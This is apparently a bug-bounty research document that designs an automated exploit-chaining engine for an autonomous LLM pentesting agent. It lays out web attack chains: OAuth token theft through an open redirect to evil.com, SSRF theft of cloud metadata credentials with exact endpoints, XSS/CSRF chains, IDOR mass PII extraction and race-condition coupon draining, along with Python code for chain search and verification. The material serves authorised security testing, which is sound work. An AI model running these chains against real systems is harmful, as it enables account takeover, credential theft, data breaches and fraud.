# R3.3 - Exploit Chain Construction Engine
## Automated Multi-Step Vulnerability Chaining Research

**Research Round:** 3.3
**Topic:** Exploit Chain Construction Engine - Automated multi-step vulnerability chaining
**Date:** 2026-03-25

---

## Executive Summary

Exploit chain construction is the process of linking individually low- or medium-severity vulnerabilities together to produce a finding with significantly greater impact than any single bug could deliver. Top-tier bug bounty hunters consistently earn five and six-figure payouts by mastering this discipline. This research documents the methodology, common chain patterns, graph-based reasoning models, connector bug taxonomy, impact escalation paths, PoC validation standards, and automated discovery approaches - all with sufficient implementation detail to be encoded into an autonomous agent.

---

## 1. Vulnerability Chaining Methodology: The Mental Model

### 1.1 Core Concept

Chaining is fundamentally a search problem over a capability graph. An attacker starts with a set of acquired capabilities (initial conditions) and must reach a target capability (e.g., account takeover, RCE, mass data breach). Each vulnerability is a transformation: it consumes one or more preconditions and produces one or more postconditions.

The mental model used by top hunters follows a bidirectional search pattern:
- **Forward search**: "I found X - what can I use this for? What does X enable?"
- **Backward search**: "I want to achieve Y (account takeover) - what do I need? What are the prerequisites for Y?"

The intersection of forward capabilities and backward requirements identifies the missing links - connector bugs to hunt for.

### 1.2 The Gadget Model (Bugcrowd)

The term "gadgets" - borrowed from ROP (Return-Oriented Programming) - describes this perfectly. Individual low-severity bugs are like gadgets: harmless alone, devastating when chained. The methodology:

1. **Collect gadgets first**: During reconnaissance, catalog every low-severity finding without discarding anything. An open redirect, a path traversal that goes nowhere obvious, a cookie without HttpOnly - these are all gadgets.
2. **Build a gadget inventory**: Index each gadget by what precondition it satisfies and what capability it provides.
3. **Match gadgets to chain slots**: When you need a specific capability to complete a chain, search your gadget inventory first.
4. **Hunt targeted connectors**: If a specific connector is missing, go hunt for it specifically rather than doing unfocused testing.

### 1.3 Vulnerability Taxonomy for Chain Reasoning

For systematic chain reasoning, each vulnerability type maps to:

```
VulnType {
    preconditions: List[Capability]      # what attacker must already have
    postconditions: List[Capability]     # what attacker gains
    amplifiers: List[VulnType]           # which bugs amplify this one
    amplified_by: List[VulnType]         # which bugs are amplified by this
    connector_value: float               # how useful as a bridge (0.0-1.0)
}
```

**Capability taxonomy (non-exhaustive):**
- `ARBITRARY_URL_FETCH` - can make server fetch any URL (SSRF primitive)
- `SCRIPT_EXECUTION_VICTIM_BROWSER` - JS executes in victim's browser context
- `FORCE_VICTIM_LOGIN` - can log victim into attacker-controlled account
- `READ_VICTIM_COOKIES` - can exfiltrate victim session tokens
- `MODIFY_REQUEST_PATH` - can alter path of browser-initiated API requests
- `CONTROL_OAUTH_REDIRECT` - can redirect OAuth callback to attacker domain
- `READ_CLOUD_METADATA` - can read AWS/GCP/Azure IMDS endpoint
- `CLOUD_IAM_CREDENTIALS` - has valid temporary cloud credentials
- `ENUMERATE_OBJECT_IDS` - can iterate/enumerate resource identifiers
- `READ_OTHER_USER_DATA` - can read data belonging to other users
- `CONCURRENT_STATE_MODIFY` - can induce race conditions in state transitions

---

## 2. Common Chain Patterns That Produce Critical Findings

### 2.1 Open Redirect + OAuth Token Theft = Account Takeover

**Severity trajectory**: Low + Low = Critical

**Chain mechanics:**
1. Identify OAuth authorization endpoint: `GET /oauth/authorize?client_id=X&redirect_uri=https://app.com/callback&response_type=token`
2. Discover open redirect on the same or related domain: `https://app.com/redirect?url=https://evil.com`
3. OAuth server allows redirect_uri matching only the domain `app.com` - but the open redirect at `app.com/redirect` passes this check
4. Craft malicious URL: `redirect_uri=https://app.com/redirect?url=https://evil.com`
5. When victim clicks the link, OAuth issues token to the open redirect endpoint, which forwards it (including the token in the URL fragment) to attacker's server
6. Attacker harvests token from server logs or JavaScript

**Real-world validation**: HackerOne report #665651 (GSA) demonstrated this exact chain. Shopify paid $500 for the same pattern. The GSA variant leaked users' entire token payload including id_token, access_token, expires_in, and scope.

**Implementation preconditions**:
- `OPEN_REDIRECT` on same domain as OAuth callback
- `OAUTH_IMPLICIT_OR_TOKEN_FLOW` (fragment-based tokens)
- Absence of `redirect_uri` exact-match validation

**Chain pseudocode for agent:**
```python
def check_oauth_open_redirect_chain(target):
    open_redirects = find_open_redirects(target.domain)
    oauth_endpoints = find_oauth_endpoints(target.domain)
    for redir in open_redirects:
        for oauth in oauth_endpoints:
            if oauth.allows_redirect_to(redir.url):
                return Chain(
                    steps=[redir, oauth],
                    impact=Impact.ACCOUNT_TAKEOVER,
                    severity=Severity.CRITICAL
                )
```

### 2.2 SSRF + Cloud Metadata = Credential Theft / RCE

**Severity trajectory**: Medium + Misconfiguration = Critical

**Chain mechanics:**
1. Discover SSRF in application (URL fetch parameter, webhook, PDF generator, image import, etc.)
2. Test fetch to `http://169.254.169.254/latest/meta-data/` (AWS IMDSv1)
3. If successful, escalate: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
4. Enumerate IAM role name, then fetch credentials: `/iam/security-credentials/{ROLE_NAME}`
5. Extract `AccessKeyId`, `SecretAccessKey`, `Token` from JSON response
6. Use credentials to access S3, invoke Lambda, describe EC2, etc.
7. If instance has permissive IAM role: arbitrary AWS API calls = effective RCE via SSM, Lambda, or ECS

**IMDSv2 bypass considerations**: IMDSv2 requires a PUT request with `X-aws-ec2-metadata-token-ttl-seconds` header to obtain a session token, then uses that token. Many SSRF primitives support custom headers (Webhook tests, Jira integrations, etc.) making IMDSv2 bypassable in some scenarios. Services with X-Forwarded-For headers will be blocked by IMDSv2 design.

**Alternative cloud targets:**
- GCP: `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` (requires `Metadata-Flavor: Google` header)
- Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (requires `Metadata: true` header)

**Chain pseudocode:**
```python
CLOUD_METADATA_ENDPOINTS = {
    "aws_v1": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "aws_v2_token": ("PUT", "http://169.254.169.254/latest/api/token"),
    "gcp": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "azure": "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
}

def exploit_ssrf_to_cloud_creds(ssrf_primitive):
    for cloud, endpoint in CLOUD_METADATA_ENDPOINTS.items():
        result = ssrf_primitive.fetch(endpoint)
        if result.contains_credentials():
            return CloudCredentialFinding(cloud=cloud, creds=result.parse_creds())
```

### 2.3 Self-XSS + Login CSRF = Stored XSS / Account Takeover

**Severity trajectory**: Informational/N/A + Low = High/Critical

**This is the canonical "connector bug" pattern** - login CSRF alone is near-zero severity, self-XSS alone is near-zero severity, but together they produce a critical.

**Chain mechanics (OAuth variant):**
1. Find self-XSS in the application (e.g., a profile field that executes JS only when the attacker views their own profile)
2. Find login CSRF - the ability to force a victim to log in to the attacker's account (often through `/login` endpoint without CSRF protection, combined with OAuth implicit flow)
3. Craft payload:
   a. Attacker creates account with malicious XSS payload in profile field
   b. Forces victim to log in as attacker via login CSRF
   c. Navigates victim to the profile page containing the XSS
   d. XSS executes in the victim's browser context, exfiltrating victim's real session cookies or performing actions as victim
4. Victim's real session is now compromised

**Advanced variant - cookie jar overflow technique:**
- Overflow the browser's cookie jar by setting many cookies
- Set a new session cookie with a more specific Path attribute (e.g., `/profile/`)
- When victim visits that path, the browser sends the attacker's session cookie for that specific endpoint
- Triggers self-XSS under victim's apparent session

**Real-world reference**: Facebook's Youssef Sammouda (sam0) demonstrated self-XSS in Facebook Payments flow leading to Instagram/Facebook account takeover in January 2026.

### 2.4 CSPT (Client-Side Path Traversal) as Universal Connector

**CSPT** is currently one of the most powerful connector bug types in 2025-2026. It allows manipulation of path segments in browser-initiated API requests.

**CSPT + CSRF (CSPT2CSRF) mechanics:**
1. Application makes a fetch to `/api/v1/[user-controlled-path]`
2. User-controlled path contains traversal: `../../admin/action`
3. This redirects the browser's authenticated API call to an unintended endpoint
4. Result: CSRF on otherwise protected admin endpoints without needing a CSRF token

**CSPT + Open Redirect chain mechanics:**
1. CSPT allows path traversal to a redirect endpoint
2. Traversal leads to `/api/v1/../../redirect?url=evil.com`
3. Redirect is trusted because it appears to originate from API
4. Full account takeover via stolen tokens

**Notable real finding**: Vitor Falcao and xssdoctor chained CSPT with CORS misconfiguration and S3/CloudFront behavior for a critical finding on a high-profile target.

### 2.5 IDOR + PII Aggregation = Mass Data Breach

**Severity trajectory**: Medium + Low recon = Critical (mass impact)

**Chain mechanics:**
1. Find IDOR on a resource endpoint: `/api/users/{id}/profile`
2. Determine ID space: sequential integers, UUIDs (check entropy), etc.
3. Find enumeration primitive: registration page leaks IDs, API returns "next" cursor, sequential invoice IDs
4. Script automated extraction across entire ID space
5. Result: mass PII breach affecting all users

**Financial variant - race condition + balance/reward logic:**
1. Find endpoint that modifies a balance atomically: `/api/redeem-coupon`
2. Test concurrent requests: send 10 simultaneous POST requests with same coupon code
3. TOCTOU race: check-then-act without locking
4. If multiple requests succeed, coupon is redeemed multiple times
5. Escalate: rewards draining, double-withdraw, inventory oversell

**Chain pseudocode:**
```python
def test_race_condition_chain(endpoint, payload, concurrency=10):
    import concurrent.futures
    with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as executor:
        futures = [executor.submit(endpoint.post, payload) for _ in range(concurrency)]
        results = [f.result() for f in concurrent.futures.as_completed(futures)]
    successes = [r for r in results if r.status_code == 200]
    if len(successes) > 1:
        return RaceConditionFinding(successes=len(successes), impact=Impact.FINANCIAL)
```

### 2.6 HTTP Request Smuggling as Universal Chain Amplifier

HTTP desync (CWE-444) is a cross-cutting amplifier that can turn otherwise unexploitable reflected XSS into wormable stored XSS, and turn SSRF into cache poisoning.

**Smuggling + Cache Poisoning + XSS:**
1. Find HTTP request smuggling between reverse proxy and backend
2. Craft smuggled request containing XSS payload targeting a cacheable endpoint
3. Next user's request for that endpoint triggers cache to serve the poisoned response
4. XSS executes for all subsequent visitors without requiring victim interaction

**Smuggling + Auth Bypass:**
1. Smuggle a request that appears to come from `127.0.0.1` or internal network
2. Backend trusts internal-origin requests, bypassing authentication
3. Access admin functionality

### 2.7 Subdomain Takeover as Trust Injection Point

**Chain mechanics:**
1. Find dangling DNS CNAME: `legacy.app.com CNAME deleted-bucket.s3.amazonaws.com`
2. Claim the deleted S3 bucket
3. Host content on `legacy.app.com` (trusted subdomain)
4. Use trusted subdomain to:
   - Set cookies for `.app.com` parent domain (SameSite=Lax cookies will be sent)
   - Serve malicious JavaScript that the CSP considers trusted (if CSP allows `*.app.com`)
   - Perform XSS against the main application
   - Intercept OAuth redirects if the subdomain is whitelisted as a redirect_uri

**Supply chain escalation**: If the claimed subdomain was a CDN endpoint used in build pipelines, it can serve malicious JavaScript that gets included in the application itself.

---

## 3. Graph-Based Chain Reasoning

### 3.1 The Exploit Dependency Graph Model

The formal model for chain reasoning is the **Exploit Dependency Graph (EDG)**, rooted in academic security research (MulVAL, 2005) and refined through attack graph theory.

**Graph structure:**
```
Nodes:
  - ConditionNode: represents a security condition or attacker capability
    { id: str, capability: Capability, satisfied: bool }
  - ExploitNode: represents a vulnerability/technique
    { id: str, vuln_type: VulnType, preconditions: List[ConditionNode], postconditions: List[ConditionNode] }

Edges:
  - precondition_edge: ExploitNode -> ConditionNode (this exploit requires this condition)
  - postcondition_edge: ConditionNode -> ExploitNode (this condition enables this exploit)
  - produces_edge: ExploitNode -> ConditionNode (this exploit produces this capability)
```

**Logical semantics:**
- ExploitNode: AND node - ALL preconditions must be satisfied
- ConditionNode: OR node - satisfied if ANY preceding exploit has produced it

This AND/OR graph model maps directly to Boolean satisfiability, enabling fast algorithmic reasoning.

### 3.2 Algorithm: Chain Discovery via Backward Induction

```python
from dataclasses import dataclass, field
from typing import List, Dict, Set, Optional
from enum import Enum

class Capability(Enum):
    INITIAL_ACCESS = "initial_access"
    OPEN_REDIRECT = "open_redirect"
    SSRF_BLIND = "ssrf_blind"
    SSRF_READ = "ssrf_read"
    CLOUD_METADATA_READ = "cloud_metadata_read"
    CLOUD_IAM_CREDS = "cloud_iam_creds"
    XSS_REFLECTED = "xss_reflected"
    XSS_STORED = "xss_stored"
    CSRF_LOGIN = "csrf_login"
    OAUTH_REDIRECT_CONTROL = "oauth_redirect_control"
    SESSION_HIJACK = "session_hijack"
    ACCOUNT_TAKEOVER = "account_takeover"
    RCE = "rce"
    MASS_DATA_BREACH = "mass_data_breach"

@dataclass
class ChainStep:
    vuln_type: str
    consumes: List[Capability]
    produces: List[Capability]
    connector_weight: float  # 0.0 = terminal, 1.0 = universal connector
    severity_alone: int      # CVSS base score without chaining
    severity_chained: int    # CVSS score when used as bridge

# The vulnerability transition table
VULN_TRANSITIONS: List[ChainStep] = [
    ChainStep("open_redirect", [Capability.INITIAL_ACCESS],
              [Capability.OPEN_REDIRECT], 0.9, 3, 9),
    ChainStep("oauth_redirect_abuse", [Capability.OPEN_REDIRECT, Capability.OAUTH_REDIRECT_CONTROL],
              [Capability.SESSION_HIJACK], 0.3, 4, 9),
    ChainStep("ssrf_basic", [Capability.INITIAL_ACCESS],
              [Capability.SSRF_READ], 0.8, 5, 8),
    ChainStep("ssrf_cloud_metadata", [Capability.SSRF_READ],
              [Capability.CLOUD_METADATA_READ], 0.6, 6, 9),
    ChainStep("cloud_cred_extraction", [Capability.CLOUD_METADATA_READ],
              [Capability.CLOUD_IAM_CREDS, Capability.RCE], 0.2, 9, 10),
    ChainStep("self_xss", [Capability.INITIAL_ACCESS],
              [Capability.XSS_REFLECTED], 0.7, 1, 8),
    ChainStep("login_csrf", [Capability.INITIAL_ACCESS],
              [Capability.CSRF_LOGIN], 0.8, 2, 8),
    ChainStep("self_xss_login_csrf_chain",
              [Capability.XSS_REFLECTED, Capability.CSRF_LOGIN],
              [Capability.XSS_STORED, Capability.ACCOUNT_TAKEOVER], 0.1, 1, 9),
    ChainStep("cspt_to_csrf", [Capability.INITIAL_ACCESS],
              [Capability.OAUTH_REDIRECT_CONTROL], 0.7, 3, 8),
]

def find_exploit_chains(
    owned_capabilities: Set[Capability],
    target_capability: Capability,
    max_depth: int = 5
) -> List[List[ChainStep]]:
    """
    BFS/DFS over the capability graph to find all chains from
    owned_capabilities to target_capability within max_depth steps.
    """
    found_chains = []

    def dfs(current_caps: Set[Capability], path: List[ChainStep], depth: int):
        if target_capability in current_caps:
            found_chains.append(list(path))
            return
        if depth >= max_depth:
            return

        for step in VULN_TRANSITIONS:
            # Check if all preconditions are met
            if all(c in current_caps for c in step.consumes):
                # Check we haven't used this step already (avoid cycles)
                if step not in path:
                    new_caps = current_caps | set(step.produces)
                    dfs(new_caps, path + [step], depth + 1)

    dfs(owned_capabilities, [], 0)

    # Sort by total chain length (shorter = better)
    found_chains.sort(key=len)
    return found_chains


def score_chain(chain: List[ChainStep]) -> float:
    """
    Score a chain by its feasibility and impact.
    Lower score = easier to execute.
    """
    if not chain:
        return float('inf')

    # Penalize length (each step is a failure point)
    length_penalty = len(chain) * 0.5

    # Reward high-severity terminal step
    terminal_severity = chain[-1].severity_chained

    # Penalize low connector weights (hard to find connectors)
    connector_difficulty = sum(1.0 - s.connector_weight for s in chain[:-1])

    return length_penalty + connector_difficulty - (terminal_severity / 2.0)
```

### 3.3 Graph Algorithms for Non-Obvious Chain Discovery

**Dijkstra for minimum-difficulty chains:**
Assign edge weights as `1.0 / connector_weight` (high connector_weight = low cost). Run Dijkstra from `INITIAL_ACCESS` to `target_capability`. The minimum-cost path is the most likely exploitable chain.

**Critical path analysis:**
For reporting purposes, identify which single connector bug, if fixed, would break the most chains. This is computed as node betweenness centrality in the exploit graph.

**Gap analysis (missing connector search):**
```python
def find_missing_connectors(
    owned_caps: Set[Capability],
    target: Capability,
    vuln_db: List[ChainStep]
) -> List[Capability]:
    """
    Given owned capabilities and a target, find the SINGLE missing capability
    that would enable the highest number of complete chains.
    """
    missing_counts: Dict[Capability, int] = {}

    for step in vuln_db:
        missing = [c for c in step.consumes if c not in owned_caps]
        if len(missing) == 1:  # Only one precondition missing
            cap = missing[0]
            missing_counts[cap] = missing_counts.get(cap, 0) + 1

    # Sort by most chain-unlocking potential
    return sorted(missing_counts.keys(), key=lambda c: -missing_counts[c])
```

This function tells the agent exactly what to go hunt for next.

---

## 4. Connector Bug Taxonomy

Connector bugs are the most valuable class for chain construction. They have low standalone severity but high chaining value.

### 4.1 Tier-1 Connectors (Universal - chain into almost anything)

| Bug Type | Standalone Severity | Chain Value | What It Enables |
|---|---|---|---|
| Open Redirect | Low (P4) | Critical | OAuth token theft, phishing with trusted domain |
| Login CSRF | Informational | High | Self-XSS escalation, account session confusion |
| CSPT (Client-Side Path Traversal) | Low (P4) | Critical | CSRF on protected endpoints, redirect to attacker |
| Subdomain Takeover | Low-Medium | Critical | Cookie injection, CSP bypass, OAuth redirect |
| Dangling CORS | Low | High | Cross-origin data read when combined with XSS |
| Cookie without SameSite | Informational | High | CSRF enablement |

### 4.2 Tier-2 Connectors (Domain-specific)

| Bug Type | Standalone Severity | Chain Value | What It Enables |
|---|---|---|---|
| Path Traversal (read-only) | Low | High | Config file read, credential exposure |
| XXE (file read) | Medium | High | SSRF from XXE, internal network access |
| CRLF Injection | Low | Medium | Header injection, log poisoning, XSS |
| HTTP Response Splitting | Low | Medium | Cache poisoning, XSS |
| Misconfigured CSP | Informational | Medium | XSS gadget (unsafe-inline, wildcard) |
| User-controlled redirect parameter | Low | High | OAuth abuse, token theft |

### 4.3 Hunting Connector Bugs Systematically

For each connector type, maintain a detection fingerprint:

```python
CONNECTOR_PATTERNS = {
    "open_redirect": [
        r"redirect[_-]?(url|uri|to|location)\s*=",
        r"next\s*=",
        r"return[_-]?to\s*=",
        r"callback\s*=",
    ],
    "cspt": [
        r"fetch\([`'\"].*\$\{.*\}",       # Template literal in fetch path
        r"axios\.(get|post)\([`'\"]\S*\$\{",  # Axios with template literal path
        r"\.href\s*=\s*[`'\"].*\+",       # href concatenation
    ],
    "login_csrf": [
        r"<form.*action.*['\"]\/login['\"]",  # Login form without CSRF check
        r"POST \/login HTTP",               # Login endpoint (check for CSRF)
    ],
    "dangling_cors": [
        r"Access-Control-Allow-Origin:\s*\*",
        r"Access-Control-Allow-Credentials:\s*true",
    ]
}
```

---

## 5. Impact Amplification: Standard Escalation Paths

### 5.1 Reflected XSS Escalation Tree

```
Reflected XSS (Medium)
├── Target lacks HttpOnly on session cookie
│   └── Steal cookie -> Session hijack -> Account Takeover (Critical)
├── Application uses weak CSRF protection (cookie-only)
│   └── Use XSS to make arbitrary authenticated requests -> CSRF bypass (High)
├── Application caches responses
│   ├── Use request smuggling to poison cache -> Persistent XSS (Critical)
│   └── ESI injection via XSS -> SSRF (High)
├── XSS on OAuth client origin
│   └── Steal tokens from postMessage or URL -> Account Takeover (Critical)
└── Admin panel accessible
    └── XSS in admin context -> Privilege escalation -> RCE via features (Critical)
```

### 5.2 SSRF Escalation Tree

```
SSRF - Blind (Medium)
├── Can control headers (e.g., Webhook with custom headers)
│   ├── Fetch cloud metadata with required headers -> Credential theft (Critical)
│   └── Reach internal services (Redis, Elasticsearch, Consul) -> Data breach (Critical)
├── SSRF on cloud infrastructure (AWS/GCP/Azure)
│   ├── IMDSv1 present -> Steal IAM credentials -> RCE (Critical)
│   └── IMDSv2 present + PUT capable -> Same path
├── Internal network access
│   ├── Port scan internal services
│   ├── Access Kubernetes API server (10.x.x.x:8443)
│   └── Access Docker socket via HTTP -> RCE (Critical)
└── File:// scheme supported
    └── Local file read -> /etc/passwd, .env files -> Credential theft
```

### 5.3 IDOR Escalation Tree

```
IDOR (read own resource) - Medium
├── Resource contains PII
│   ├── Single user -> P2 (High)
│   └── Enumerable IDs (sequential) -> Mass breach -> P1 (Critical)
├── IDOR on write/modify operation
│   ├── Modify other user's settings -> Partial account takeover
│   └── Modify payment/billing -> Financial fraud (Critical)
├── IDOR exposes internal IDs
│   └── Use internal IDs as oracle for further attacks
└── IDOR on delete operation
    └── Mass account deletion -> Critical DoS
```

### 5.4 Information Disclosure Escalation

```
Info Disclosure (Low)
├── Source code disclosure
│   ├── Hardcoded secrets -> API keys, DB creds -> Full compromise
│   └── Business logic understanding -> Auth bypass discovery
├── Stack trace / error message
│   ├── Internal paths -> Directory traversal targets
│   └── Framework version -> Known CVE lookup
├── JWT secret or private key exposure
│   └── Forge arbitrary JWT -> Authentication bypass -> Account Takeover
└── API key in JS bundle
    └── Privilege depends on key scope; potentially Critical
```

---

## 6. Chain Validation and Proof Standards

### 6.1 What Triagers Need to See

A convincing chain report must satisfy three criteria:
1. **Reproducibility**: Triager must be able to reproduce each step independently
2. **Causality**: Each step's output must be demonstrated as the next step's input
3. **Impact clarity**: Final capability must be unmistakably dangerous

### 6.2 Chain Report Structure

```markdown
## Vulnerability Chain: [Brief Name]

### TL;DR
[One sentence describing the full chain and final impact]

### Severity: Critical
Chain components:
- Step 1: [Bug Type] - [Standalone Severity]
- Step 2: [Bug Type] - [Standalone Severity]
- Combined impact: [Final Impact]

### Prerequisites
- Victim must be logged in: Yes/No
- Victim user interaction required: Yes/No (one click / zero click)
- Attacker needs existing account: Yes/No

### Step-by-Step Reproduction

**Step 1: [Establish precondition - finding the connector]**
1. Navigate to [exact URL]
2. Observe [specific response/behavior]
3. Confirm: [screenshot/response body snippet]

**Step 2: [Exploit the connector to acquire capability]**
1. Craft payload: `[exact payload]`
2. Send to [exact endpoint]
3. Observe: [screenshot showing capability acquired]

**Step 3: [Use acquired capability for final impact]**
1. [Exact steps]
2. Observe: [screenshot showing account takeover / data exfiltrated / etc.]

### Proof of Concept Code
[Working PoC script - Python or JavaScript]

### Impact
[Specific real-world consequence: "An attacker can take over any user account
with a single malicious link, requiring only one victim click."]
```

### 6.3 Chain Verification Algorithm (Agent-Side)

```python
@dataclass
class ChainVerificationResult:
    chain: List[ChainStep]
    steps_verified: int
    steps_total: int
    status: str  # "PROVEN", "PARTIAL", "BLOCKED", "THEORETICAL"
    evidence: List[dict]
    blocking_reason: Optional[str] = None

def verify_chain(chain: List[ChainStep], target: str) -> ChainVerificationResult:
    evidence = []
    for i, step in enumerate(chain):
        result = attempt_exploit_step(step, target, acquired_caps=evidence)
        if result.success:
            evidence.append(result.proof)
        else:
            return ChainVerificationResult(
                chain=chain,
                steps_verified=i,
                steps_total=len(chain),
                status="PARTIAL" if i > 0 else "BLOCKED",
                evidence=evidence,
                blocking_reason=result.failure_reason
            )
    return ChainVerificationResult(
        chain=chain,
        steps_verified=len(chain),
        steps_total=len(chain),
        status="PROVEN",
        evidence=evidence
    )
```

The status enum maps directly to the exploit-gate system:
- `PROVEN`: Full chain executed end-to-end, reportable
- `PARTIAL`: Chain partially demonstrated, reportable with documented blocker
- `BLOCKED`: First step failed, do not report
- `THEORETICAL`: Never attempted, do not report

---

## 7. Automated Chain Discovery: Tools and Algorithms

### 7.1 Academic Foundations

**MulVAL (Multi-host, multi-stage Vulnerability Analysis Logic)** is the canonical academic tool. It uses Datalog-style reasoning rules to automatically construct attack graphs from:
- CVE precondition/postcondition data from NVD
- Network topology facts
- Host configuration facts

ML-based approaches achieve 88.8% accuracy (rule-based) and 95.7% accuracy (MLP-based) for generating precondition/postcondition fields from CVE text descriptions.

**RAG-LLM Attack Graph Generation** (arxiv:2408.05855): Uses retrieval-augmented generation to chain CVEs based on their semantic preconditions and effects, building attack graphs automatically from NVD descriptions.

**AGBuilder** (Springer 2019): AI planning tool using textual vulnerability descriptions to automatically generate, update, and refine attack graphs.

### 7.2 LLM-Based Autonomous Chain Discovery (2024-2026)

**Project Naptime / Big Sleep (Google DeepMind)**: Framework using Chain-of-Thought reasoning, interactive debugging environment, and specialized tools. In November 2024, discovered first real-world vulnerability (SQLite stack buffer underflow) fully autonomously.

**AutoPentester** (arxiv:2510.05605): LLM agent framework achieving 27.0% higher subtask completion than PentestGPT baseline, 39.5% greater vulnerability coverage, with 92.6% less human intervention. Uses iterative loop: plan -> execute tool -> observe -> update state.

**PentestAgent** (ACM AsiaCCS 2025): Fully autonomous LLM pentesting with online search augmentation. Key innovation: separates "what to do" (planning) from "how to do it" (execution) using distinct specialized agents.

**CAI (Cybersecurity AI)**: Open, bug-bounty-ready AI framework specifically designed around HackerOne-style reporting.

### 7.3 Implementation Architecture for Project Triage's Chain Engine

```python
class ExploitChainEngine:
    """
    Core chain construction and validation engine for autonomous pentesting.
    """

    def __init__(self, vuln_db: List[ChainStep], llm_client):
        self.vuln_db = vuln_db
        self.llm = llm_client
        self.capability_graph = self._build_capability_graph()
        self.discovered_vulns: Dict[str, ChainStep] = {}
        self.owned_capabilities: Set[Capability] = {Capability.INITIAL_ACCESS}

    def _build_capability_graph(self) -> Dict[Capability, List[ChainStep]]:
        """Build reverse index: capability -> which steps produce it"""
        graph: Dict[Capability, List[ChainStep]] = {}
        for step in self.vuln_db:
            for cap in step.produces:
                graph.setdefault(cap, []).append(step)
        return graph

    def ingest_finding(self, finding: dict) -> None:
        """
        Called when a new vulnerability is discovered.
        Updates owned capabilities and triggers chain analysis.
        """
        vuln_type = finding["type"]
        new_step = self._classify_finding_to_step(finding)

        # Update capability set
        for cap in new_step.produces:
            self.owned_capabilities.add(cap)

        # Trigger chain analysis
        new_chains = self.discover_chains_from_new_capability(new_step)
        self._prioritize_and_queue(new_chains)

    def discover_chains_from_new_capability(
        self,
        new_step: ChainStep
    ) -> List[List[ChainStep]]:
        """
        When a new capability is acquired, find all newly-enabled chains.
        Uses backward induction from high-value targets.
        """
        high_value_targets = [
            Capability.ACCOUNT_TAKEOVER,
            Capability.RCE,
            Capability.MASS_DATA_BREACH,
            Capability.CLOUD_IAM_CREDS,
        ]

        all_chains = []
        for target in high_value_targets:
            chains = find_exploit_chains(
                owned_capabilities=self.owned_capabilities,
                target_capability=target,
                max_depth=4
            )
            all_chains.extend(chains)

        return all_chains

    def identify_missing_connectors(self) -> List[Capability]:
        """
        Given current owned capabilities, what single bug would unlock
        the most chains? This drives targeted testing.
        """
        return find_missing_connectors(
            owned_caps=self.owned_capabilities,
            target=Capability.ACCOUNT_TAKEOVER,
            vuln_db=self.vuln_db
        )

    def llm_augmented_chain_hypothesis(
        self,
        target_description: str,
        owned_caps: Set[Capability]
    ) -> List[str]:
        """
        Use LLM to reason about non-obvious chains specific to the target.
        Provides target context to LLM for domain-specific reasoning.
        """
        prompt = f"""
        Target application: {target_description}

        Currently owned capabilities: {[c.value for c in owned_caps]}

        Known vulnerability transition rules: {self._summarize_vuln_db()}

        Task: Reason about non-obvious exploit chains specific to this application type.
        Consider application-specific business logic, unusual technology combinations,
        and any attack patterns that may not be in the standard database.

        Output: List of hypothesized chains as [step1_type -> step2_type -> impact]
        Ranked by likelihood and impact.
        """
        return self.llm.complete(prompt)

    def _classify_finding_to_step(self, finding: dict) -> ChainStep:
        """Map a raw finding dict to a ChainStep using the vulnerability taxonomy"""
        # Implementation: pattern match finding type to VULN_TRANSITIONS table
        vuln_type = finding.get("type", "unknown")
        for step in self.vuln_db:
            if step.vuln_type == vuln_type:
                return step
        # Fall back to LLM classification for unknown types
        return self._llm_classify_finding(finding)
```

### 7.4 Chain Scoring and Prioritization

```python
def prioritize_chains(chains: List[List[ChainStep]]) -> List[tuple]:
    """
    Score chains by: impact * feasibility / length
    Returns sorted list of (score, chain) tuples.
    """
    scored = []
    for chain in chains:
        if not chain:
            continue

        # Impact: severity of final step when chained
        impact_score = chain[-1].severity_chained / 10.0

        # Feasibility: product of connector weights (probability all steps succeed)
        feasibility = 1.0
        for step in chain:
            feasibility *= step.connector_weight

        # Length penalty
        length_penalty = 1.0 / (1 + len(chain) * 0.3)

        score = impact_score * feasibility * length_penalty
        scored.append((score, chain))

    scored.sort(key=lambda x: -x[0])
    return scored
```

---

## 8. Key Implementation Recommendations for Project Triage

### 8.1 Data Structures

1. **Capability enum**: Fixed vocabulary of attacker states (30-50 entries covers 95% of web app attacks)
2. **VulnTransitionTable**: The core knowledge base - maps bug types to preconditions/postconditions
3. **ChainEngine**: Stateful session object that accumulates capabilities and drives discovery
4. **ConnectorHunter**: Targeted scanner that tests for the specific missing connectors identified by gap analysis

### 8.2 Integration Points

- **Perceptor feeds ChainEngine**: Every finding from the perceptor module calls `chain_engine.ingest_finding()`
- **ChainEngine drives Perceptor**: `chain_engine.identify_missing_connectors()` returns a prioritized list of what to test next
- **MCTS uses chain scores**: Chain feasibility scores serve as MCTS node values for search prioritization
- **Self-reflect validates chains**: Before any chain is reported, the self-reflection module runs `verify_chain()`

### 8.3 LLM-Augmented vs. Algorithmic Reasoning

Use algorithmic graph search for:
- Known chain patterns (fast, deterministic)
- Finding missing connectors (gap analysis)
- Scoring and prioritization

Use LLM for:
- Classifying novel/unknown bug types into the capability taxonomy
- Hypothesizing application-specific chains based on technology stack
- Generating connector bug test payloads once the missing capability is identified
- Writing the final chain report narrative

### 8.4 The "One Missing Connector" Optimization

The highest-value use of limited testing time is to identify and hunt the single connector bug that would unlock a complete chain. The `find_missing_connectors()` function computes this analytically. This insight - that low-severity connector bugs are often worth more testing effort than additional high-severity standalone bugs - is the key mental model shift that separates top-tier hunters from average ones.

---

## Summary of Actionable Chain Patterns

| Chain | Severity | Key Connector | Probability |
|---|---|---|---|
| Open Redirect + OAuth Implicit | Critical | Open redirect in OAuth domain | High |
| SSRF + AWS IMDSv1 | Critical | SSRF on cloud infrastructure | High |
| Self-XSS + Login CSRF | Critical | Login CSRF | Medium |
| CSPT + CSRF bypass | High | CSPT in API URL construction | Medium |
| Subdomain Takeover + Cookie injection | High | Dangling CNAME | Medium |
| HTTP Smuggling + Cache Poisoning + XSS | Critical | Smuggling primitive | Low |
| IDOR + Sequential IDs + PII | Critical | Enumerable IDs | High |
| Race Condition + Financial endpoint | Critical | TOCTOU in transaction | Medium |
| JWT None/Confusion + Role claim | Critical | JWT validation gap | Medium |
| Path Traversal + Source disclosure + Hardcoded secrets | Critical | Readable source | High |

---

